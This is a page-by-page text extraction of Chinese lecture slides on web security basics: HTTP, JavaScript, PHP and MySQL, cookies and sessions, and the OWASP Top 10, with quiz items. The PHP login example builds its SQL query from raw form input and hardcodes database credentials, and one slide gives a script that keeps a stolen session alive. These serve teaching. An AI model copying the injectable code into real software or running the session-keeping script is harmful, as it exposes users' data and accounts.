# Lecture08 Web安全 - 逐页文字版

> 说明：本文件由 PDF 文本层逐页抽取生成，用于核对覆盖；复习请优先看同目录下的“复习讲义”。

## 来源：lecture08part1-Web安全.pdf

### lecture08part1-Web安全.pdf / Page 1

第十章 WEB安全基础
知识点一：WEB基础
知识点二：WEB编程环境
知识点三：JavaScript实践
知识点四：PHP语言
知识点五：PHP连接数据库
知识点六：HTTP会话管理
知识点七：HTTP请求
知识点八：Cookie实战
知识点九：十大WEB安全威胁

### lecture08part1-Web安全.pdf / Page 2

知识点一：WEB基础

### lecture08part1-Web安全.pdf / Page 3

1

HTTP协议
超文本传输协议（HTTP，HyperText Transfer Protocol)是互联网上应用最为广泛的一种网络
协议。所有的WWW文件都必须遵守这个标准。设计HTTP最初的目的是为了提供一种发布和
接收HTML页面的方法。通过HTTP或者HTTPS协议请求的资源由统一资源标示符（Uniform
Resource Identifiers）（或者，更准确一些，URLs）来标识。

### lecture08part1-Web安全.pdf / Page 4

1

HTTP协议

关于HTTP协议的详细内容请参考RFC2616。HTTP协议采用了请求/响应模型。客户
端向服务器发送一个请求，请求头包含请求的方法、URL、协议版本、以及包含请
求修饰符、客户信息和内容的类似于成功或者错误编码加上包含服务器信息、实体
元信息以及可能的实体内容。MIME的消息结构。服务器以一个状态行作为响应，
响应的内容包括消息协议的版本，

### lecture08part1-Web安全.pdf / Page 5

2

HTML

“超文本”就是指页面内可以包含图片、链接，甚至音乐、程序等非文字元素。超文本标
记语言Html的结构包括“头”部分（英语：Head）、和“主体”部分（英语：Body），
其中“头”部提供关于网页的信息，“主体”部分提供网页的具体内容。
一个网站对应多个HTML文件，超文本标记语言文件以.htm（磁盘操作系统DOS限制的外
语缩写）为扩展名或.html（外语缩写）为扩展名。可以使用任何能够生成TXT类型源文件
的文本编辑器来产生超文本标记语言文件，只用修改文件后缀即可。

### lecture08part1-Web安全.pdf / Page 6

标准的超文本标记语言文件都具有一个基本的整体结构

标记一般都是成对出现（部分标记

标记符<html>，说明该文件是用超

除外例如：<br/>），即超文本标记

文本标记语言（本标签的中文全称）

语言文件的开头与结尾标志和超文

来描述的，它是文件的开头;而

本标记语言的头部与实体两大部分。

</html>，则表示该文件的结尾，它

有三个双标记符用于页面整体结构

们是超文本标记语言文件的开始标

的确认。

记和结尾标记。

### lecture08part1-Web安全.pdf / Page 7

<head></head>
<head></head>
这2个标记符分别表示头部信息的开始和结尾。头部中包含的标记是页面的标题、序言、
说明等内容，它本身不作为内容来显示，但影响网页显示的效果。头部中最常用的标
记符是标题标记符和meta标记符，其中标题标记符用于定义网页的标题，它的内容显示
在网页窗口的标题栏中，网页标题可被浏览器用作书签和收藏清单。
<body></body>
网页中显示的实际内容均包含在这2个正文标记符之间。正文标记符又称为实体标记。

### lecture08part1-Web安全.pdf / Page 8

3

Javascript
JavaScript一种直译式脚本语言，它的解释器被称为JavaScript引擎，为浏览器的一部分，广泛
用于客户端的脚本语言，最早是在HTML（标准通用标记语言下的一个应用）网页上使用，用
来给HTML网页增加动态功能。
JavaScript是一种属于网络的脚本语言，已经被广泛用于Web应用开发，常用来为网页添加各式
各样的动态功能,为用户提供更流畅美观的浏览效果。通常JavaScript脚本是通过嵌入在HTML中
来实现自身的功能的。

### lecture08part1-Web安全.pdf / Page 9

Javascript脚本语言同其他语言一样
有它自身的基本数据类型，表达式和算术运算符
及程序的基本程序框架。Javascript提供了四种基
本的数据类型和两种特殊数据类型用来处理数据
和文字。而变量提供存放信息的地方，表达式则
可以完成较复杂的信息处理。
日常
用途

嵌入动态文本于HTML页面、对浏览器事件做出
响应、读写HTML元素、在数据被提交到服务器
之前验证数据、检测访客的浏览器信息、控制
cookies，包括创建和修改等。

### lecture08part1-Web安全.pdf / Page 10

示例如下
<html>
<head>
<title>Javascript简单示例</title>
</head>
<body>
<script language="javascript">
alert("第一个javascript");
</script>
</body>
</html>

### lecture08part1-Web安全.pdf / Page 11

单选题

1分

统一资源标示符是指

A

HTTP

B

HTML

C

URL

D

BODY
提交

### lecture08part1-Web安全.pdf / Page 12

知识点二：WEB编程环境

### lecture08part1-Web安全.pdf / Page 13

WEB编程语言

分为WEB静态语言和WEB动态语言，WEB静态语言就是通常所见到的超
文本标记语言（标准通用标记语言下的一个应用），WEB动态语言主要是
ASP、PHP、JAVASCRIPT、JAVA、CGI等计算机脚本语言编写出来的执行
灵活的互联网网页程序。

### lecture08part1-Web安全.pdf / Page 14

1

WEB服务环境安装
p PHPnow是Win32下绿色免费的Apache + PHP + MySQL 环境套件包。
简易安装、快速搭建支持虚拟主机的 PHP 环境。附带 PnCp.cmd控
制面板，帮助你快速配置你的套件，使用非常方便。
p PHPnow 是绿色的，解压后执行 Setup.cmd 初始化，即可得到一个
PHP + MySQL 环境。然后就可以直接安装 Discuz!, PHPWind, DeDe,
WordPress 等程序。

### lecture08part1-Web安全.pdf / Page 15

PHPnow 是绿色的
解压后执行 Setup.cmd 初始化，即可得到一个 PHP + MySQL 环境。
在windows7及以上版本安装的时候，会遭遇管理员权限、路径包含非英文字符的问题，安装所
注意的细节如下：

（1）解压phpnow后（切近路径不能
出现中文，有可能导致以后服务无
法正常启动），点setup.cmd即可进
入安装界面，之后，选择init.cmd：

### lecture08part1-Web安全.pdf / Page 16

然而，很可能无法安装成功

提示apache_cn服务安装失败。这个
是因为需要管理员权限方可完成服
务的安装。

（2）解决管理员权限问题的做法
是 ： 到 c:\windows\system32 中 找
到cmd.exe，右键，以管理员方式
运行；启动后，通过dos对话框切
入phpnow的安装路径：

### lecture08part1-Web安全.pdf / Page 18

然后运行init.cmd

安装完毕，将看到phpnow的默认界面。
此时，安装完后目录如下：

### lecture08part1-Web安全.pdf / Page 19

安装完后目录如下

### lecture08part1-Web安全.pdf / Page 20

点击PnCp.cmd，如下

### lecture08part1-Web安全.pdf / Page 21

选择序号20，即可启动PHPnow
打开网页，访问http://127.0.0.1如下：

### lecture08part1-Web安全.pdf / Page 22

点击phpMyAdmin
将进入数据库管理界面，可以自行创建数据库、表以及录入数据等：

### lecture08part1-Web安全.pdf / Page 23

知识点三：JavaScript实践

### lecture08part1-Web安全.pdf / Page 24

使 用 工 具 Dreamweaver， 来 编 辑 产 生 一 个 静 态 网 页 ， 该 网 页 命 名 为
js.htm，存储到PHPnow\htdocs下。
在网页js.htm中，进行如下四个代码的编辑和运行，可以看到Javascript
对浏览器中网页内各元素的读写功能。

### lecture08part1-Web安全.pdf / Page 25

document.write ()函数
<html>
<head>
<title>Javascript简单示例</title>
<script language="javascript">
for(i= 1; i <= 100; i++){
num= Math.floor(Math.random() * 100);//0-99
之间的随机数
document.write(num,"");
}
</script>
</head>
<body>
</body>
</html>

### lecture08part1-Web安全.pdf / Page 26

单击按钮后调用函数
<html>
<head>
<title>Javascript简单示例</title>
<script language="javascript">
function func1(){
alert("按钮单击后调用的函数1！");
}
function func2(){
alert("按钮单击后调用的函数2！");
}
</script>
</head>
<body>
<!--单击后调用两个函数用”,“隔开 -->
<input type="button" value="单击我" onClick="func1(), func2()" />
</body>
</html>

### lecture08part1-Web安全.pdf / Page 27

使用对象：同样使用function。
<html>
<head>
<title>Javascript简单示例</title>
</head>
<body>
<script language="javascript">
function Student(name, school, grade){
this.name= name;//注意这里要用this
this.school=school;
this.grade= grade;
}
hui= new Student("noting_gonna", "XX学校", "小学二年级");
//使用with可以省略对象名
with(hui){
document.write(name+ ": " + school + "," + grade + "<br />");
}
if(window.hui){
document.write("hui这个对象存在");
}
else
document.write("hui这个对象不存在");
</script>
</body>
</html>

### lecture08part1-Web安全.pdf / Page 28

获取input（text）中的内容 :name.value
<html>
<head>
<title>Javascript简单示例</title>
</head>
<body>
<script language="javascript">
function getLoginMsg(){
//以下也达到了省略对象名称的作用
loginMsg= document.loginForm;
alert("账号：" +loginMsg.userID.value + "\n" + "密码：" +loginMsg.password.value);
}
function setLoginMsg(Object){
alert(Object.id);
}
</script>
<form name="loginForm">
账号：<input type="text" name="userID" /><br />
密码：<input type="text" name="password" /><br />
<input type="button" value="登录" onclick="getLoginMsg()" />
记住密码<input type="checkbox" id="这是checkbox的id" onclick="setLoginMsg(this)" />
</form>
</body>
</html>

### lecture08part1-Web安全.pdf / Page 29

知识点四：PHP语言

### lecture08part1-Web安全.pdf / Page 30

1

PHP语言

PHP是一种免费的脚本语言，主要用途是处理动态网页，也包含了命令行
运行接口。
p 是一种解释性语言。是完全免费的，在http://www.php.net下载，遵循
GPL。PHP的语法和C/C++，Java，Perl，ASP，JSP有相通之处并且加上
了自己的语法。
p 由于PHP是一种面向HTML的解析语言，所以，PHP语句被包含在PHP
标记里面，PHP标记外的语句都被直接输出。包括在PHP标记中的语句
被解析，在其外的语句原样输出并且接受PHP语句的控制。

### lecture08part1-Web安全.pdf / Page 31

四种标记
标记

解释

示例

<?php ?>

标准php标记

<?php echo $variable; ?>

<script language="php">
</script>

长标记

<script language="php"> echo $vaiable;
</script>

<? ?>

短标记

<? echo $variable; ?>

<% %>

仿ASP

<%=$variable;%>

### lecture08part1-Web安全.pdf / Page 32

PHP需要在每个语句后用分号结束指令
在一个PHP代码段中的最后一行可以不用分号结束

注释

使用注释可以增加语言的可读性，PHP支持三种C/C++、
perl、unix-shell风格的注释：

Ø # ——Perl式的单行注释
Ø // ——C++式的单行注释
Ø /* */ ——C/C++式多行注释

变量
解析

变量解析当遇到符号（$）时产生，解析器会尽可能多地
取得后面的字符以组成一个合法的变量名，然后将变量
值替换他们，如果$后面没有有效的变量名，则输出"$"。
如果想明确的变量名可以用花括号把变量名括起来。

### lecture08part1-Web安全.pdf / Page 33

<?php
$username = “liuzheli”;
$SQLStr = "SELECT * FROM userinfo where username='$username'";
echo $SQLStr ;
?>
在对上述php段进行解析时，第一个$标识的username将被解析为一个变量，因为第一次定
义，将分配内存空间被赋以初值liuzheli。在第二个标识的变量SQLStr的初值中，因为
$username已经被解析为变量，所以，最终显示的结果将是：SELECT * FROM userinfo
where username=' liuzheli '。
同样也可以解析数组索引或者对象属性。对于数组索引，右方括号（]）
标志着索引的结束。对象属性则和简单变量适用同样的规则。

### lecture08part1-Web安全.pdf / Page 34

单选题

1分
<HTML><HEAD></HEAD><BODY>
<?php $username = “liuzheli”; $SQLStr = “$username=123"; echo $SQLStr ; ?>456
</BODY></HTML>
以上HTML页面运行后，页面中将输出

A

username=123456

B

username123

C

liuzheli=123456

D

liuzheli=123
提交

### lecture08part1-Web安全.pdf / Page 35

知识点五：HTTP会话管理

### lecture08part1-Web安全.pdf / Page 36

HTTP会话管理

在计算机术语中，会话是指一个
终端用户与交互系统进行通讯的
过程，比如从输入账户密码进入
操作系统到退出操作系统就是一
个会话过程。

会话较多用于网络上，TCP的三次握手
就创建了一个会话，TCP关闭连接就是
关闭会话。用平述的语言可以解释为：
你拔打你女友的电话号码，你女友接听，
然后一翻“亲爱的”，直到任何一方挂
掉电话，这个过程就是一个会话。你挑
逗一只小狗，它跟你互动，也是会话；
它不鸟你，那就不形成会话。

### lecture08part1-Web安全.pdf / Page 37

HTTP协议属于无状态的通信协议
无状态是指，当浏览器发送请求给服务器的时候，服务器响应，但是当同一个
浏览器再发送请求给服务器的时候，他不知道你就是刚才那个浏览器。简单地
说，就是服务器不会去记得你，所以是无状态协议。

本质是，HTTP是短连接的，请求响
应后，断开了TCP连接，下一次连接
与上一次无关。

### lecture08part1-Web安全.pdf / Page 38

为了识别不同的请求是否来自同一客户，需要引用HTTP会话机制

即：多次HTTP连接间维护用户与同一用户发出的不同请求之间关联的情况称为维护一个
会话（session）。通过会话管理对会话进行创建、信息存储、关闭等。

### lecture08part1-Web安全.pdf / Page 39

HTTP会话的实现机制

Cookie与session是与HTTP会话相关的两个内容，其
中Cookie存在在浏览器，session存储在服务器中。
Cookies是服务器在本地机器上存储的小段文本并
随每一个请求发送至同一个服务器。网络服务器用
HTTP头向客户端发送cookies，在客户终端，浏览
器解析这些cookies并将它们保存为一个本地文件，
它会自动将同一服务器的任何请求缚上这些cookies。

### lecture08part1-Web安全.pdf / Page 40

具体来说，cookie机制采用的是在客户端保持状态的方案

它是在用户端的会话状态的存贮机制，需要用户打开客户端的cookie支持。
cookie的作用是为了解决HTTP协议无状态的缺陷所作的努力。
ü 正统的cookie分发是通过扩展HTTP协议来实现的，服务器通过在
HTTP的响应头中加上一行特殊的指示以提示浏览器按照指示生成相应
的cookie。然而纯粹的客户端脚本如JavaScript也可以生成cookie。而
cookie的使用是由浏览器按照一定的原则在后台自动发送给服务器的。
ü 浏览器检查所有存储的cookie，如果某个cookie所声明的作用范围大于
等于将要请求的资源所在的位置，则把该cookie附在请求资源的HTTP
请求头上发送给服务器。

### lecture08part1-Web安全.pdf / Page 41

cookie的内容主要包括
名字，值，过期时间，路径和域。路径与域一起构成cookie的作用范围。若不设
置过期时间，则表示这个cookie的生命期为浏览器会话期间，关闭浏览器窗口，
cookie就消失。这种生命期为浏览器会话期的cookie被称为会话cookie。
会话cookie一般不存储在硬盘上而是保存在内存里，当然这种行为并不是规范规定的。

ü 若设置了过期时间，浏览器就会把cookie保存到硬盘上，关闭后再次打开浏览
器，这些cookie仍然有效直到超过设定的过期时间。
ü 存储在硬盘上的cookie可以在不同的浏览器进程间共享，比如两个IE窗口。而
对于保存在内存里的cookie，不同的浏览器有不同的处理方式。

### lecture08part1-Web安全.pdf / Page 42

Session机制是一种服务器端的机制
服务器使用一种类似于散列表的结构（也可能就是使用散列表）来保存信息。
ü 当程序需要为某个客户端的请求创建一个session时，服务器首先检查这个客户端
的请求里是否已包含了一个session标识（称为session id），如果已包含则说明以
前已经为此客户端创建过session，服务器就按照session id把这个session检索出来
使用（检索不到，会新建一个），如果客户端请求不包含session id，则为此客户
端创建一个session并且生成一个与此session相关联的session id。
ü session id的值应该是一个既不会重复，又不容易被找到规律以仿造的字符串，这
个session id将被在本次响应中返回给客户端保存。

### lecture08part1-Web安全.pdf / Page 43

保存这个session id的方式可以采用cookie
这样在交互过程中浏览器可以自动的按照规则把这个标识发挥给服务器。一般
这个cookie的名字都是类似于SEEESIONID。
所以，一种常见的HTTP会话管
理就是，服务器端通过session来
维护客户端的会话状态，而在客
户端通过cookie来存储当前会话
的session id。
还有一种技术叫做表单隐藏字段。
就是服务器会自动修改表单，添加
一个隐藏字段，以便在表单提交时
能够把session id传递回服务器。

URL重写: 但cookie可以被人为
的禁止，必须有其他机制以便
在cookie被禁止时仍然能够把
session id传递回服务器。经常
被使用的一种技术叫做URL重
写，就是把session id直接附加
在URL路径的后面。

### lecture08part1-Web安全.pdf / Page 44

单选题

1分

有关cookie说法正确的是

A

存储在服务器端

B

不存在失效期

C

可以被人为禁止

D

不同浏览器之间不能共享
提交

### lecture08part1-Web安全.pdf / Page 45

知识点六：HTTP请求

### lecture08part1-Web安全.pdf / Page 46

使用工具Dreamweaver

来编辑产生一个静态网页，该网页命名为login.htm，存储到PHPnow\htdocs下。
注：htdocs是PHPnow的web应用的根目录。

### lecture08part1-Web安全.pdf / Page 47

所编辑的login.htm代码如下：

<form id="form1" name="form1" method="post" action="loginok.php">
<table width="900" border="0" cellspacing="0" cellpadding="0">
<tr>
<td height="20">姓名</td>
<td height="20"><label>
<input name="username" type="text" id="username" />
</label></td>
</tr>

### lecture08part1-Web安全.pdf / Page 48

所编辑的login.htm代码如下：
<tr>
<td height="20">口令</td>
<td height="20"><label>
<input name="pwd" type="password" id="pwd" />
</label></td>
</tr>
<tr>
<td height="20">&nbsp;</td>
<td height="20"><label>
<input type="submit" name="Submit" value="提交" />
</label></td>
</tr>
</table>
</form>

### lecture08part1-Web安全.pdf / Page 49

Form
表单

表单属
性

表单是一个包含表单元素的区域。表单区域里包含了两个文本
框（<input>）、一个确认按钮(submit) 。确认按钮的作用是
当用户单击确认按钮时，表单的内容会被传送到另一个文件。
p 表单的动作属性(action)定义了目的文件的文件名。
由动作属性定义的这个文件通常会对接收到的输入
数据进行相关的处理。在上面的表单中定义了接受
表单输入的处理文件为“loginok.php”。
p method属性指定了与服务器进行信息交互的方法
为POST。

### lecture08part1-Web安全.pdf / Page 50

Http定义了与服务器交互的不同方法，最基本的方法有4种

GET

POST

分别是

PUT

DELETE

URL全称是资源描述符，我们可以这
样认为：一个URL地址，它用于描述
一个网络上的资源，而HTTP中的GET、
POST、PUT、DELETE就对应着对这
个资源的查，改，增，删4个操作。
GET一般用于获取/查询资源信息，
而POST一般用于更新资源信息，早
期的系统由于不支持DELETE，因此
PUT和DELETE用的较少。

### lecture08part1-Web安全.pdf / Page 51

处理提交输入的第一个php文件代码如下：

搭建环境，将表单的输入改为GET，php的程序也改为GET，看看变化在哪里？

### lecture08part1-Web安全.pdf / Page 52

具体的，POST和GET的区别如下：
GET请求的数据会附在URL之后
（就是把数据放置在HTTP协议头中），以?分割URL和传输数据，参数之间以&相连，
如：login.action?name=sean&password=123。
POST把提交的数据则放置在是HTTP包的包体中

POST的安全性要比GET的安全性高：
(1) GET模式下，通过URL就可以作数据修改
(2) GET模式下，用户名和密码将明文出现在URL上，因为登录页面有可能被
浏览器缓存、其他人查看浏览器的历史纪录，那么别人就可以拿到你的账
号和密码了
(3) GET模式下，提交数据还可能会造成跨站请求伪造攻击

### lecture08part1-Web安全.pdf / Page 53

单选题

1分

有关POST和GET两种HTTP请求方式，说法错误的是

A

POST安全性更高

B

GET一般用于获取/查询资源信息

C

POST一般用于更新资源信息

D

GET请求中的参数将被打包到HTTP包体中
提交

### lecture08part1-Web安全.pdf / Page 54

知识点七：PHP连接数据库

### lecture08part1-Web安全.pdf / Page 55

建表

在myDB库中，设有一个表userinfo，包含两个字段，即

假设在上述loginok.php中实现对输入的用户名和密码进行认证，代码如下：

### lecture08part1-Web安全.pdf / Page 56

<?php
$conn=mysql_connect("localhost", "root", "123456"); //连接数据库
$username = $_POST['username'];
$pwd = $_POST['pwd'];
$SQLStr = "SELECT * FROM userinfo where username='$username' and
pwd='$pwd'"; echo $SQLStr ;
$result=mysql_db_query("MyDB", $SQLStr, $conn); //执行数据库SQL语句
if ($row=mysql_fetch_array($result))//读取数据内容
echo "<br>OK<br>";
else
echo "<br>false<br>";
mysql_free_result($result); // 释放资源
mysql_close($conn); // 关闭连接
?>
如果登陆成功，则显示OK，否则，显示false。

### lecture08part1-Web安全.pdf / Page 57

数据库应用开发三步骤
1. 连接数据库：
$conn=mysql_connect("local
host", "root", "123456");
数据库的连接
分为几步：

2. 执行SQL操作：
$result=mysql_db_query("MyDB",
$SQLStr, $conn);

3. 关闭连接：
mysql_free_result($result);
mysql_close($conn);

### lecture08part1-Web安全.pdf / Page 58

查询数据后显示数据
数据库的操作主要依赖于SQL语句，查询数据并显示的一个例子如示例
<?php
// 定位到第一条记录
mysql_data_seek($result, 0);
// 循环取出记录
while ($row=mysql_fetch_row($result))
{
for ($i=0; $i<mysql_num_fields($result); $i++ )
{
echo $row[$i];
echo " | ";
}
echo "<br>";
}
?>

### lecture08part1-Web安全.pdf / Page 59

<?php
$conn=mysql_connect("localhost", "root", "123456"); //连接数据库
$SQLStr = "SELECT * FROM userinfo "; //echo $SQLStr ;
$result=mysql_db_query("MyDB", $SQLStr, $conn); //执行数据库SQL语句
// 定位到第一条记录
mysql_data_seek($result, 0);
// 循环取出记录
while ($row=mysql_fetch_row($result))
{
for ($i=0; $i<mysql_num_fields($result); $i++ )
{
echo $row[$i];
echo " | ";
}
echo "<br>";
}
mysql_free_result($result); // 释放资源
mysql_close($conn); // 关闭连接
?>
创建show.php来演示验证

### lecture08part1-Web安全.pdf / Page 60

知识点八：Cookie实战

### lecture08part1-Web安全.pdf / Page 61

Cookie

Cookie
和
session

共性：都可以暂时保存在多个页面中使用的变量。
区别：cookie存放在客户端浏览器，session保存在服务器。它们之
间的联系是session ID一般保存在cookie中，来实现HTTP会话管理。

生成Cookie：当客户访问某网站时，PHP可以使用setcookie函数告
诉浏览器生成一个cookie，并把这个cookie保存在c:\Documents and
Cookie
工作
原理

Settings\用户名\Cookies目录下。
使用Cookie：Cookie是HTTP标头的一部分，当客户再次访问该网站
时，浏览器会自动把与该站点对应的cookie发送到服务器，服务器
则把从客户端传来的cookie将自动地转化成一个PHP变量。

### lecture08part1-Web安全.pdf / Page 62

SetCookie函数
对 cookie 进行赋值的函数为setcookie，赋值成功返回 true，否则返回 false。
函数原型如下：
setcookie(name, value, expire, path, domain, secure)
name 必需。规定 cookie 的名称。
value 必需。规定 cookie 的值。
expire 可选。规定 cookie 的有效期。
举例，time()+3600*24*30 将设置 cookie 的过期时间为 30 天。
secure 可选。规定是否通过安全的 HTTPS 连接来传输 cookie。
domain 可选。规定 cookie 的域名。
path 可选。规定 cookie 的路径。

### lecture08part1-Web安全.pdf / Page 63

如下实例设置COOKIE
<?php
if ($row=mysql_fetch_array($result))//读取数据内容
{
setcookie("uname",$username);//创建一个索引为uname的cookie
echo "<br>OK<br>";
} else {
echo "<br>false<br>";
}
?>
在loginok.php中对应修改

### lecture08part1-Web安全.pdf / Page 64

如下示例获取Cookie
可以通过 $HTTP_COOKIE_VARS[“uname”] 或 $_COOKIE[“ uname ”] 来
访问索引为name的 cookie 的值。
<?php
if ($_COOKIE["uname"]==null)
echo "should cookie";
else
echo "ok";
?>
在show.php中对应修改

### lecture08part1-Web安全.pdf / Page 65

Cookie

由于示例所使用的是内存COOKIE，即没有设定COOKIE值的expires参
数，也就是没有设置COOKIE的失效时间情况下，这个COOKIE在关闭
浏览器后将失效，并且不会保存在本地。
验证：关闭浏览器后，重新打开浏览器直接访问useCookie.php，则发现，
提示should cookie。

通过show.php进行验证

### lecture08part1-Web安全.pdf / Page 66

设置Cookie有效期
修改示例中的COOKIE类型为设置expires参数

即COOKIE的值指定了失效时间，比如
setcookie("uname",$username, time()+3600*24*30)，
那么这个COOKIE 会保存在本地，关闭浏览器后再访问网站useCookie.php，
则发现，提示ok。
可见：在COOKIE有效时间内所有的请求都会带上这个本地保存COOKIE。

### lecture08part1-Web安全.pdf / Page 67

结论

如果一个页面依赖于某个cookie，而cookie的值或者文件被泄露后，即
使没有登录，也可能利用该cookie来访问该页面，这就是cookie在客户
端不安全引发的后果。

### lecture08part1-Web安全.pdf / Page 68

单选题

1分

如果一个cookie设置了expires参数，说法错误的是

A

该cookie具有一定的生命周期

B

该cookie在失效前不会跟随浏览器关闭而销毁

C

该cookie失效前会存储在客户端

D

该cookie只能在创建该cookie的电脑里使用
提交

### lecture08part1-Web安全.pdf / Page 69

进一步WEB开发实战

添加新闻：输入新闻标题、新闻内容，将数据添加到news表中
查看新闻列表：显示新闻的标题
查看新闻：点某个新闻标题，查看该新闻的详细内容
页面跳转：登录成功后，跳转到添加新闻页面。
请同学们根据教材和视频自行实践

### lecture08part1-Web安全.pdf / Page 70

知识点九：十大WEB安全威胁

### lecture08part1-Web安全.pdf / Page 71

为什么要关注Web应用安全？

攻击面向Web迁移
• 几乎所有系统都有Web接口
• 直接暴露在公网
• 攻击门槛低

攻击入口
from 二进制程序
to Web接口

### lecture08part1-Web安全.pdf / Page 72

为什么要关注Web应用安全？

攻击面向Web迁移

Web应用连接核心资产

• 几乎所有系统都有Web接口
• 直接暴露在公网
• 攻击门槛低

• 数据库（用户、隐私、资金）
• 内部服务（微服务、云资源）
• 文件系统

攻击入口
from 二进制程序
to Web接口

不只是“crash”程序
而是直接拿数据
控制系统等

### lecture08part1-Web安全.pdf / Page 73

为什么要关注Web应用安全？

攻击面向Web迁移

Web应用连接核心资产

开发复杂度增加

• 几乎所有系统都有Web接口
• 直接暴露在公网
• 攻击门槛低

• 数据库（用户、隐私、资金）
• 内部服务（微服务、云资源）
• 文件系统

• 多语言（JS/PHP/Java/Python）
• 多组件（前端+后端+API+第三方服务）
• 大量框架

攻击入口
from 二进制程序
to Web接口

不只是“crash”程序
而是直接拿数据
控制系统等

逻辑漏洞远多于底层漏洞
安全边界模糊

### lecture08part1-Web安全.pdf / Page 74

传统漏洞 vs. Web漏洞

### lecture08part1-Web安全.pdf / Page 75

两类漏洞的联系

共同根源：输入不可信
• Buffer overflow：输入太长
• SQL注入：输入被拼接进查询
• XSS：输入被当成HTML执行

把输入当成代码或指令执行

### lecture08part1-Web安全.pdf / Page 76

两类漏洞的联系

共同根源：输入不可信
• Buffer overflow：输入太长
• SQL注入：输入被拼接进查询
• XSS：输入被当成HTML执行

把输入当成代码或指令执行

攻击链可跨层
1.
2.
3.
4.
5.
6.

Web漏洞（SQL注入）
获取数据库数据
拿到管理员凭证
登录后台
上传恶意文件
触发服务端代码执行（RCE）

Web漏洞作为入口
引发系统漏洞

### lecture08part1-Web安全.pdf / Page 77

两类漏洞的联系

共同根源：输入不可信
• Buffer overflow：输入太长
• SQL注入：输入被拼接进查询
• XSS：输入被当成HTML执行

把输入当成代码或指令执行

攻击链可跨层
1.
2.
3.
4.
5.
6.

Web漏洞（SQL注入）
获取数据库数据
拿到管理员凭证
登录后台
上传恶意文件
触发服务端代码执行（RCE）

Web漏洞作为入口
引发系统漏洞

二者的混合
•
•

Java反序列化漏洞
• 看似Web输入
• 实则触发ROP
SSRF
• 可以访问内部服务
• 再触发Redis/JVM/native漏洞

漏洞利用机制并不单一

### lecture08part1-Web安全.pdf / Page 78

Web应用十大安全威胁排名
根据2010年OWASP（开放Web软件安全项目—Open Web Application Security Project）发布
的Web应用十大安全威胁排名，排在前十位的安全风险依次为：注入、跨站脚本、遭破坏
的身份认证和会话管理、不安全的直接对象引用、伪造跨站请求、安全配置错误、不安全
的加密存储、没有限制的URL访问、传输层保护不足和未验证的重定向和转发。

注入、跨站脚本和跨站请求伪造将在第十一章介绍

### lecture08part1-Web安全.pdf / Page 79

四大根因
• 输入处理错误
• 身份权限问题
• 数据保护问题
• 系统配置/设计问题

### lecture08part1-Web安全.pdf / Page 80

四大根因
输入当代码执行（注入/XSS）

• 输入处理错误
• 身份权限问题
• 数据保护问题
• 系统配置/设计问题
安全配置错误；
不安全重定向

认证/会话；IDOR；
未限制URL访问；CSRF
不安全加密；传输层保护不足

### lecture08part1-Web安全.pdf / Page 81

2025 OWASP Top-10 列表

传统

Bugs

代码
错误

Systems

### lecture08part1-Web安全.pdf / Page 82

2025 OWASP Top-10 列表

设计、架构、配置
相关

Bugs

Systems

### lecture08part1-Web安全.pdf / Page 83

1

遭破坏的身份认证和会话管理
（1）基本概念

l “遭破坏的认证和会话管理”是指攻击者窃听了用户访问HTTP时的用户名
和密码，或者是用户的会话，从而得到sessionID或用户身份信息，进而冒
充用户进行HTTP访问的过程。
l 由于HTTP本身是无状态的，HTTP的每次访问请求都要带有个人凭证，
SessionID是用户访问请求的凭证。sessionID本身很容易在网络上被嗅探到，
所以攻击者往往通过监听sessionID来实现进一步的攻击，这就是这种安全
风险居高不下的重要原因，但这种形式的攻击主要针对身份认证和会话。

### lecture08part1-Web安全.pdf / Page 84

（2）密码的安全性

l 密码（口令）是最常见的一种认证手段，持有正确密码的人被认为是可信的。使用密
码进行认证的优点是成本低，认证过程实现简单
l 缺点是密码认证是一种比较弱的安全手段，因而存在被猜解的可能。
l 目前黑客们常用的破解密码手段，不是暴力破解，而是使用一些弱口令去尝试进行字
典攻击破解，比如123456，admin等，同时猜解用户名，直到发现使用这些弱口令的
账户为止。由于用户名往往是公开的信息，攻击者可以收集一份用户名的字典，这种
攻击成本很低，然而效果却很好。密码的保存也有一些需要注意的地方，例如，密码
必须使用不可逆的加密算法或者是单向散列函数算法进行加密后存储到数据库中。这
可以最大程度地保证密码的私密性。

### lecture08part1-Web安全.pdf / Page 85

（3）用户的认证必须通过加密信道进行传输

l 在用户登录时，在用户输入用户名和密码后一般通过POST的方法进行传
输，认证信息可通过不安全的HTTP传递，也可通过加密的HTTPS传递。
有些网站在登录页面显示的是HTTPS，而事实上却是用HTTP。
l 检测是否使用HTTPS的最简单方法就是使用网络嗅探工具，如通过
SnifferPro或Ethereal嗅探数据包来判断是否加密。

### lecture08part1-Web安全.pdf / Page 86

（4）会话劫持攻击

l SessionID一旦在生命周期内被窃取，就等于账户失窃。由于SessionID是
用户登录持有的认证凭证，因此黑客不需要再想办法通过用户名和密码
进行登录，而是直接使用窃取的SessionID与服务器进行交互。
l 会话劫持就是一种窃取用户SessionID后，使用该SessionID登录进入目标
账户的攻击方法，此时攻击者实际上是利用了目标账户的有效Session。
如果SessionID是被保存在Cookie中，则这种攻击被称为Cookie劫持。

### lecture08part1-Web安全.pdf / Page 87

（5）会话保持攻击

l Session是有生命周期的，当用户长时间未活动后，或者用户点击退出后，
服务器将销毁Session。
l 如果攻击者窃取了用户的Session，并一直保持一个有效的Session（比如间
隔性地刷新页面，以使服务器认为这个用户仍然在活动），而服务器对于
活动的Session也一直不销毁，攻击者就能通过此有效Session一直使用用户
的账户，即成为一个永久的“后门”，这就是会话保持攻击。

### lecture08part1-Web安全.pdf / Page 88

（5）会话保持攻击
l 下面一段代码，能保持Session始终有效。

<script>
var url=”http://bbs.example.com/index.php?sid=1”;
Window.setInterval(“keepsid()”,6000);//按照指定的周期（以毫秒计）
来调用函数或计算表达式
Fuction keepsid()
{
Document.getElementById(“a1”).src=url+”&time=”+Math.random();
}
</script>
<iframe id=”a1” src=””></iframe>
IFrame内联框架被用来在当前 HTML 文档中嵌入另一个文档
其原理就是不停地刷新页面，以保持Session不过期

### lecture08part1-Web安全.pdf / Page 89

2

不安全的直接对象引用
（1）基本概念

l 不安全的直接对象引用在OWASP TOP 10排名中居于第四位，它可以被归于
访问控制一类威胁。
l 直接对象引用：是指WEB应用程序的开发人员将一些不应公开的对象引用
直接暴露给用户，使得用户可以通过更改URL等操作直接引用对象。
l 不安全的直接对象引用：是指一个用户通过更改URL等操作可以成功访问
到未被授权的内容。比如一个网站上的用户通过更改URL可以访问到其他
用户的私密信息和数据等。

### lecture08part1-Web安全.pdf / Page 90

（2）不安全的直接对象引用的原理

